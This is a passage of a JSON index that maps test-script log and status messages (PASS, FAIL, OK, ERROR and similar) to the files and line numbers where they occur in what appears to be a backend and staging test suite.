    "[CRITICAL] Configuration Status:": {
      "value": "[CRITICAL] Configuration Status:",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:69",
        "scripts/test_staging_config.py:90"
      ]
    },
    "[CRITICAL] Majority of test files violate limits. Consider systematic refactoring.": {
      "value": "[CRITICAL] Majority of test files violate limits. Consider systematic refactoring.",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_violations_reporter.py:56"
      ]
    },
    "[Coverage] Coverage Report: reports/coverage/html/index.html": {
      "value": "[Coverage] Coverage Report: reports/coverage/html/index.html",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:419"
      ]
    },
    "[Coverage] Total Coverage:": {
      "value": "[Coverage] Total Coverage:",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:412"
      ]
    },
    "[DEBUG] Full error details:": {
      "value": "[DEBUG] Full error details:",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:133",
        "scripts/test_staging_config.py:150"
      ]
    },
    "[DEBUG] Running command for": {
      "value": "[DEBUG] Running command for",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:443"
      ]
    },
    "[DIR]": {
      "value": "[DIR]",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:143"
      ]
    },
    "[DRY RUN] Would rename to:": {
      "value": "[DRY RUN] Would rename to:",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:178"
      ]
    },
    "[ERROR]": {
      "value": "[ERROR]",
      "category": "test_literals",
      "locations": [
        "scripts/simple_test_fix_loop.py:78",
        "scripts/test_verify_workflow_status_corrected.py:55",
        "scripts/unified_test_runner.py:470"
      ]
    },
    "[ERROR] Auth database connection failed": {
      "value": "[ERROR] Auth database connection failed",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:81"
      ]
    },
    "[ERROR] Auth database test failed:": {
      "value": "[ERROR] Auth database test failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:102"
      ]
    },
    "[ERROR] Backend database connection failed": {
      "value": "[ERROR] Backend database connection failed",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:38"
      ]
    },
    "[ERROR] Backend database test failed:": {
      "value": "[ERROR] Backend database test failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:59"
      ]
    },
    "[ERROR] Command:": {
      "value": "[ERROR] Command:",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:471"
      ]
    },
    "[ERROR] Configuration loading failed:": {
      "value": "[ERROR] Configuration loading failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:132",
        "scripts/test_staging_config.py:149"
      ]
    },
    "[ERROR] Error:": {
      "value": "[ERROR] Error:",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:60"
      ]
    },
    "[ERROR] Failed to run": {
      "value": "[ERROR] Failed to run",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:480"
      ]
    },
    "[ERROR] Failed to run frontend tests:": {
      "value": "[ERROR] Failed to run frontend tests:",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend_quick.py:44",
        "scripts/test_frontend_simple.py:66"
      ]
    },
    "[ERROR] Failed to run tests:": {
      "value": "[ERROR] Failed to run tests:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:68"
      ]
    },
    "[ERROR] File not found:": {
      "value": "[ERROR] File not found:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_syntax_fix_classes.py:95"
      ]
    },
    "[ERROR] Frontend tests timed out after 30 seconds": {
      "value": "[ERROR] Frontend tests timed out after 30 seconds",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend_quick.py:41"
      ]
    },
    "[ERROR] Iteration": {
      "value": "[ERROR] Iteration",
      "category": "test_literals",
      "locations": [
        "scripts/batch_fix_and_test.py:96"
      ]
    },
    "[ERROR] PostgreSQL not available:": {
      "value": "[ERROR] PostgreSQL not available:",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:157"
      ]
    },
    "[ERROR] Scanning": {
      "value": "[ERROR] Scanning",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:93"
      ]
    },
    "[FAILED]": {
      "value": "[FAILED]",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:183"
      ]
    },
    "[FAILED] STAGING STARTUP TESTS FAILED": {
      "value": "[FAILED] STAGING STARTUP TESTS FAILED",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:277"
      ]
    },
    "[FAILURE] Some tests failed. Please check the errors above.": {
      "value": "[FAILURE] Some tests failed. Please check the errors above.",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:191"
      ]
    },
    "[FAIL]": {
      "value": "[FAIL]",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:177",
        "scripts/test_staging_deployment.py:98",
        "scripts/test_staging_deployment.py:121",
        "scripts/test_staging_deployment.py:142",
        "scripts/test_staging_startup.py:253",
        "scripts/test_staging_startup.py:257",
        "scripts/test_verify_workflow_status.py:178",
        "scripts/unified_test_runner.py:656"
      ]
    },
    "[FAIL] Backend startup tests failed": {
      "value": "[FAIL] Backend startup tests failed",
      "category": "test_literals",
      "locations": [
        "scripts/startup_test_executor.py:99"
      ]
    },
    "[FAIL] Build failed.": {
      "value": "[FAIL] Build failed.",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:506"
      ]
    },
    "[FAIL] CHECKS FAILED with exit code": {
      "value": "[FAIL] CHECKS FAILED with exit code",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:516"
      ]
    },
    "[FAIL] DataSubAgent test failed:": {
      "value": "[FAIL] DataSubAgent test failed:",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:124"
      ]
    },
    "[FAIL] E2E tests failed": {
      "value": "[FAIL] E2E tests failed",
      "category": "test_literals",
      "locations": [
        "scripts/startup_test_executor.py:263"
      ]
    },
    "[FAIL] Enhanced registry test failed:": {
      "value": "[FAIL] Enhanced registry test failed:",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:177"
      ]
    },
    "[FAIL] Failed:": {
      "value": "[FAIL] Failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:217"
      ]
    },
    "[FAIL] Frontend startup tests failed": {
      "value": "[FAIL] Frontend startup tests failed",
      "category": "test_literals",
      "locations": [
        "scripts/startup_test_executor.py:171"
      ]
    },
    "[FAIL] InitializationManager test failed:": {
      "value": "[FAIL] InitializationManager test failed:",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:80"
      ]
    },
    "[FAIL] Iteration": {
      "value": "[FAIL] Iteration",
      "category": "test_literals",
      "locations": [
        "scripts/batch_fix_and_test.py:88"
      ]
    },
    "[FAIL] Linting failed. Use --fix to auto-fix issues.": {
      "value": "[FAIL] Linting failed. Use --fix to auto-fix issues.",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:470"
      ]
    },
    "[FAIL] TEST FAILED:": {
      "value": "[FAIL] TEST FAILED:",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:176"
      ]
    },
    "[FAIL] TESTS FAILED with exit code": {
      "value": "[FAIL] TESTS FAILED with exit code",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:396"
      ]
    },
    "[FAIL] Tests failed": {
      "value": "[FAIL] Tests failed",
      "category": "test_literals",
      "locations": [
        "scripts/simple_test_fix_loop.py:71"
      ]
    },
    "[FAIL] Tests failed. Found": {
      "value": "[FAIL] Tests failed. Found",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:115"
      ]
    },
    "[FAIL] Type checking failed.": {
      "value": "[FAIL] Type checking failed.",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:481"
      ]
    },
    "[FAIL] UNEXPECTED ERROR:": {
      "value": "[FAIL] UNEXPECTED ERROR:",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:179"
      ]
    },
    "[FAIL] WebSocket Connection:": {
      "value": "[FAIL] WebSocket Connection:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:180"
      ]
    },
    "[FIXED]": {
      "value": "[FIXED]",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_syntax_fix_classes.py:91"
      ]
    },
    "[FIXED] Fixed and verified": {
      "value": "[FIXED] Fixed and verified",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:328"
      ]
    },
    "[GAPS] Identifying test gaps...": {
      "value": "[GAPS] Identifying test gaps...",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:54"
      ]
    },
    "[GOOD] Most test files comply. Address remaining violations.": {
      "value": "[GOOD] Most test files comply. Address remaining violations.",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_violations_reporter.py:60"
      ]
    },
    "[INFO] Cloud SQL connector not installed (optional for local dev):": {
      "value": "[INFO] Cloud SQL connector not installed (optional for local dev):",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:117"
      ]
    },
    "[INFO] Environment Variables:": {
      "value": "[INFO] Environment Variables:",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:33"
      ]
    },
    "[INFO] No ENVIRONMENT set, using test values for local testing": {
      "value": "[INFO] No ENVIRONMENT set, using test values for local testing",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:140"
      ]
    },
    "[INFO] No frontend tests found - passing": {
      "value": "[INFO] No frontend tests found - passing",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend_quick.py:31"
      ]
    },
    "[INFO] Running frontend tests:": {
      "value": "[INFO] Running frontend tests:",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend_simple.py:50"
      ]
    },
    "[INFO] Running full staging test suite...": {
      "value": "[INFO] Running full staging test suite...",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:102"
      ]
    },
    "[INFO] Running quick staging health checks...": {
      "value": "[INFO] Running quick staging health checks...",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:99"
      ]
    },
    "[INFO] Running standard staging tests...": {
      "value": "[INFO] Running standard staging tests...",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:105"
      ]
    },
    "[INFO] To run frontend tests, install dependencies with: cd frontend && npm install": {
      "value": "[INFO] To run frontend tests, install dependencies with: cd frontend && npm install",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend_simple.py:24"
      ]
    },
    "[INTERRUPTED] Test run cancelled by user": {
      "value": "[INTERRUPTED] Test run cancelled by user",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:65"
      ]
    },
    "[LIVE MODE - Testing real connections]": {
      "value": "[LIVE MODE - Testing real connections]",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:232"
      ]
    },
    "[MAJOR]": {
      "value": "[MAJOR]",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_validator.py:301"
      ]
    },
    "[MINOR]": {
      "value": "[MINOR]",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_validator.py:301"
      ]
    },
    "[MISSING]": {
      "value": "[MISSING]",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:346",
        "scripts/test_frontend.py:451"
      ]
    },
    "[OK]": {
      "value": "[OK]",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:346",
        "scripts/test_discovery_report.py:77",
        "scripts/test_discovery_report.py:146",
        "scripts/test_frontend.py:451",
        "scripts/test_staging_startup.py:52",
        "scripts/test_staging_startup.py:90",
        "scripts/test_staging_startup.py:120",
        "scripts/test_staging_startup.py:150",
        "scripts/test_staging_startup.py:187"
      ]
    },
    "[OK] All dependencies resolved": {
      "value": "[OK] All dependencies resolved",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:102"
      ]
    },
    "[OK] All project tests comply with real test requirements!": {
      "value": "[OK] All project tests comply with real test requirements!",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:310"
      ]
    },
    "[OK] All required configuration loaded": {
      "value": "[OK] All required configuration loaded",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:133"
      ]
    },
    "[OK] All secrets accessible": {
      "value": "[OK] All secrets accessible",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:167"
      ]
    },
    "[OK] All test files are compliant!": {
      "value": "[OK] All test files are compliant!",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_compliance.py:190"
      ]
    },
    "[OK] All tests comply with real test requirements!": {
      "value": "[OK] All tests comply with real test requirements!",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:472"
      ]
    },
    "[OK] Async test configuration already updated": {
      "value": "[OK] Async test configuration already updated",
      "category": "test_literals",
      "locations": [
        "scripts/fix_common_test_issues.py:17"
      ]
    },
    "[OK] Auth database connection closed": {
      "value": "[OK] Auth database connection closed",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:97"
      ]
    },
    "[OK] Auth database connection successful": {
      "value": "[OK] Auth database connection successful",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:79"
      ]
    },
    "[OK] Auth database initialized": {
      "value": "[OK] Auth database initialized",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:74"
      ]
    },
    "[OK] Auth database status:": {
      "value": "[OK] Auth database status:",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:86"
      ]
    },
    "[OK] Backend database connection closed": {
      "value": "[OK] Backend database connection closed",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:54"
      ]
    },
    "[OK] Backend database connection successful": {
      "value": "[OK] Backend database connection successful",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:36"
      ]
    },
    "[OK] Backend database initialized": {
      "value": "[OK] Backend database initialized",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:31"
      ]
    },
    "[OK] Backend database status:": {
      "value": "[OK] Backend database status:",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:43"
      ]
    },
    "[OK] Backend startup tests passed (": {
      "value": "[OK] Backend startup tests passed (",
      "category": "test_literals",
      "locations": [
        "scripts/startup_test_executor.py:97"
      ]
    },
    "[OK] Cloud SQL connector is available": {
      "value": "[OK] Cloud SQL connector is available",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:114"
      ]
    },
    "[OK] Connected to database:": {
      "value": "[OK] Connected to database:",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:93"
      ]
    },
    "[OK] E2E tests passed (": {
      "value": "[OK] E2E tests passed (",
      "category": "test_literals",
      "locations": [
        "scripts/startup_test_executor.py:261"
      ]
    },
    "[OK] Exit code:": {
      "value": "[OK] Exit code:",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:56"
      ]
    },
    "[OK] Frontend startup tests passed (": {
      "value": "[OK] Frontend startup tests passed (",
      "category": "test_literals",
      "locations": [
        "scripts/startup_test_executor.py:169"
      ]
    },
    "[OK] Health endpoints configured": {
      "value": "[OK] Health endpoints configured",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:191"
      ]
    },
    "[OK] No changes needed:": {
      "value": "[OK] No changes needed:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_syntax_fix_classes.py:93"
      ]
    },
    "[OK] No size violations found!": {
      "value": "[OK] No size violations found!",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:446"
      ]
    },
    "[OK] PostgreSQL is running on localhost:": {
      "value": "[OK] PostgreSQL is running on localhost:",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:145"
      ]
    },
    "[OK] PostgreSQL version:": {
      "value": "[OK] PostgreSQL version:",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:50"
      ]
    },
    "[OK] Service initialization order correct": {
      "value": "[OK] Service initialization order correct",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:69"
      ]
    },
    "[OK] Startup completed in": {
      "value": "[OK] Startup completed in",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:209"
      ]
    },
    "[OUTPUT]": {
      "value": "[OUTPUT]",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:52"
      ]
    },
    "[OUTPUT] Output:": {
      "value": "[OUTPUT] Output:",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:58"
      ]
    },
    "[PASSED]": {
      "value": "[PASSED]",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:183"
      ]
    },
    "[PASS]": {
      "value": "[PASS]",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:95",
        "scripts/test_staging_deployment.py:118",
        "scripts/test_staging_deployment.py:139",
        "scripts/test_staging_startup.py:250",
        "scripts/test_verify_workflow_status.py:178",
        "scripts/unified_test_runner.py:656"
      ]
    },
    "[PASS] ALL ENVIRONMENT DETECTION TESTS PASSED!": {
      "value": "[PASS] ALL ENVIRONMENT DETECTION TESTS PASSED!",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:167"
      ]
    },
    "[PASS] ALL TESTS PASSED in": {
      "value": "[PASS] ALL TESTS PASSED in",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:394"
      ]
    },
    "[PASS] Agent created:": {
      "value": "[PASS] Agent created:",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:55",
        "netra_backend/app/agents/test_agent_initialization.py:104"
      ]
    },
    "[PASS] Agent retrieved:": {
      "value": "[PASS] Agent retrieved:",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:168"
      ]
    },
    "[PASS] All": {
      "value": "[PASS] All",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:180"
      ]
    },
    "[PASS] All OAuth config tests passed!": {
      "value": "[PASS] All OAuth config tests passed!",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:151"
      ]
    },
    "[PASS] All auth client environment detection tests passed!": {
      "value": "[PASS] All auth client environment detection tests passed!",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:62"
      ]
    },
    "[PASS] All middleware environment default tests passed!": {
      "value": "[PASS] All middleware environment default tests passed!",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:104"
      ]
    },
    "[PASS] All schema default tests passed!": {
      "value": "[PASS] All schema default tests passed!",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:122"
      ]
    },
    "[PASS] Already passing": {
      "value": "[PASS] Already passing",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:310"
      ]
    },
    "[PASS] Correctly defaults to STAGING when no env vars": {
      "value": "[PASS] Correctly defaults to STAGING when no env vars",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:31"
      ]
    },
    "[PASS] Correctly defaults to staging for ambiguous service name": {
      "value": "[PASS] Correctly defaults to staging for ambiguous service name",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:53"
      ]
    },
    "[PASS] Correctly detects production when explicitly specified": {
      "value": "[PASS] Correctly detects production when explicitly specified",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:60"
      ]
    },
    "[PASS] Correctly detects staging from ENVIRONMENT var": {
      "value": "[PASS] Correctly detects staging from ENVIRONMENT var",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:38"
      ]
    },
    "[PASS] Correctly detects staging from K_SERVICE": {
      "value": "[PASS] Correctly detects staging from K_SERVICE",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:46"
      ]
    },
    "[PASS] Execution context created:": {
      "value": "[PASS] Execution context created:",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:119"
      ]
    },
    "[PASS] Factory compliance defaults to staging": {
      "value": "[PASS] Factory compliance defaults to staging",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:91"
      ]
    },
    "[PASS] Factory status integration defaults to staging": {
      "value": "[PASS] Factory status integration defaults to staging",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:100"
      ]
    },
    "[PASS] Fallback mode:": {
      "value": "[PASS] Fallback mode:",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:105"
      ]
    },
    "[PASS] Fallback result:": {
      "value": "[PASS] Fallback result:",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:74"
      ]
    },
    "[PASS] Fallback used:": {
      "value": "[PASS] Fallback used:",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:75"
      ]
    },
    "[PASS] Health status:": {
      "value": "[PASS] Health status:",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:109"
      ]
    },
    "[PASS] Individual agent registration:": {
      "value": "[PASS] Individual agent registration:",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:164"
      ]
    },
    "[PASS] Initialization result:": {
      "value": "[PASS] Initialization result:",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:54"
      ]
    },
    "[PASS] Initialization time:": {
      "value": "[PASS] Initialization time:",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:56"
      ]
    },
    "[PASS] Iteration": {
      "value": "[PASS] Iteration",
      "category": "test_literals",
      "locations": [
        "scripts/batch_fix_and_test.py:86"
      ]
    },
    "[PASS] OAuth config correctly configured for staging": {
      "value": "[PASS] OAuth config correctly configured for staging",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:149"
      ]
    },
    "[PASS] Passed:": {
      "value": "[PASS] Passed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:216"
      ]
    },
    "[PASS] PermissionRequest schema defaults to staging": {
      "value": "[PASS] PermissionRequest schema defaults to staging",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:118"
      ]
    },
    "[PASS] Registry created": {
      "value": "[PASS] Registry created",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:150"
      ]
    },
    "[PASS] Registry health:": {
      "value": "[PASS] Registry health:",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:172"
      ]
    },
    "[PASS] Tests passed!": {
      "value": "[PASS] Tests passed!",
      "category": "test_literals",
      "locations": [
        "scripts/simple_test_fix_loop.py:68"
      ]
    },
    "[PASS] Tests passed! (Run": {
      "value": "[PASS] Tests passed! (Run",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:113"
      ]
    },
    "[PASS] ToolPermissionMiddleware defaults to staging": {
      "value": "[PASS] ToolPermissionMiddleware defaults to staging",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:82"
      ]
    },
    "[PASS] WebSocket Connection: Connected": {
      "value": "[PASS] WebSocket Connection: Connected",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:177"
      ]
    },
    "[QUALITY] Assessing test quality...": {
      "value": "[QUALITY] Assessing test quality...",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:50"
      ]
    },
    "[REAL E2E] TESTS WITH ACTUAL LLM/SERVICES": {
      "value": "[REAL E2E] TESTS WITH ACTUAL LLM/SERVICES",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:71"
      ]
    },
    "[RECOMMEND] Generating improvement recommendations...": {
      "value": "[RECOMMEND] Generating improvement recommendations...",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:58"
      ]
    },
    "[REPORT] Detailed report saved to:": {
      "value": "[REPORT] Detailed report saved to:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:230"
      ]
    },
    "[RESULT] Exit code:": {
      "value": "[RESULT] Exit code:",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:46"
      ]
    },
    "[REVIEW] Running Autonomous Test Review in": {
      "value": "[REVIEW] Running Autonomous Test Review in",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:35"
      ]
    },
    "[Report] HTML Report: reports/tests/report.html": {
      "value": "[Report] HTML Report: reports/tests/report.html",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:417"
      ]
    },
    "[SETUP] Environment variables set:": {
      "value": "[SETUP] Environment variables set:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_config.py:62"
      ]
    },
    "[SETUP] Setting staging environment variables...": {
      "value": "[SETUP] Setting staging environment variables...",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_config.py:32"
      ]
    },
    "[SIMULATE] Checking configuration...": {
      "value": "[SIMULATE] Checking configuration...",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:118"
      ]
    },
    "[SIMULATE] Checking dependencies...": {
      "value": "[SIMULATE] Checking dependencies...",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:88"
      ]
    },
    "[SIMULATE] Checking health endpoints...": {
      "value": "[SIMULATE] Checking health endpoints...",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:185"
      ]
    },
    "[SIMULATE] Checking initialization order...": {
      "value": "[SIMULATE] Checking initialization order...",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:50"
      ]
    },
    "[SIMULATE] Checking secrets...": {
      "value": "[SIMULATE] Checking secrets...",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:148"
      ]
    },
    "[SIMULATE] Startup time: 12s (limit:": {
      "value": "[SIMULATE] Startup time: 12s (limit:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:201"
      ]
    },
    "[SIMULATION MODE - Not connecting to real services]": {
      "value": "[SIMULATION MODE - Not connecting to real services]",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:230"
      ]
    },
    "[SKIPPED]": {
      "value": "[SKIPPED]",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:183"
      ]
    },
    "[SKIP]": {
      "value": "[SKIP]",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:656"
      ]
    },
    "[SKIP] Cannot auto-fix:": {
      "value": "[SKIP] Cannot auto-fix:",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:336"
      ]
    },
    "[STATUS]": {
      "value": "[STATUS]",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:57"
      ]
    },
    "[SUCCESS] ALL CHECKS PASSED": {
      "value": "[SUCCESS] ALL CHECKS PASSED",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:514"
      ]
    },
    "[SUCCESS] All configuration checks completed": {
      "value": "[SUCCESS] All configuration checks completed",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:127"
      ]
    },
    "[SUCCESS] All tests passed! Async PostgreSQL configuration is working.": {
      "value": "[SUCCESS] All tests passed! Async PostgreSQL configuration is working.",
      "category": "test_literals",
      "locations": [
        "scripts/test_async_postgres.py:189"
      ]
    },
    "[SUCCESS] All tests passed! Staging deployment is healthy.": {
      "value": "[SUCCESS] All tests passed! Staging deployment is healthy.",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:237"
      ]
    },
    "[SUCCESS] Applied": {
      "value": "[SUCCESS] Applied",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:299"
      ]
    },
    "[SUCCESS] Basic unit tests are passing!": {
      "value": "[SUCCESS] Basic unit tests are passing!",
      "category": "test_literals",
      "locations": [
        "scripts/fix_common_test_issues.py:85"
      ]
    },
    "[SUCCESS] Configuration loaded successfully!": {
      "value": "[SUCCESS] Configuration loaded successfully!",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:64",
        "scripts/test_staging_config.py:78"
      ]
    },
    "[SUCCESS] Environment detection is properly configured!": {
      "value": "[SUCCESS] Environment detection is properly configured!",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:173"
      ]
    },
    "[SUCCESS] STAGING STARTUP TESTS PASSED": {
      "value": "[SUCCESS] STAGING STARTUP TESTS PASSED",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:275"
      ]
    },
    "[SUCCESS] Staging configuration test completed": {
      "value": "[SUCCESS] Staging configuration test completed",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_config.py:144"
      ]
    },
    "[TEST]": {
      "value": "[TEST]",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:23"
      ]
    },
    "[TEST] Running test:": {
      "value": "[TEST] Running test:",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status.py:35"
      ]
    },
    "[TEST] Testing API Endpoints...": {
      "value": "[TEST] Testing API Endpoints...",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:199"
      ]
    },
    "[TEST] Testing Authentication Flow...": {
      "value": "[TEST] Testing Authentication Flow...",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:203"
      ]
    },
    "[TEST] Testing Service Health Endpoints...": {
      "value": "[TEST] Testing Service Health Endpoints...",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:195"
      ]
    },
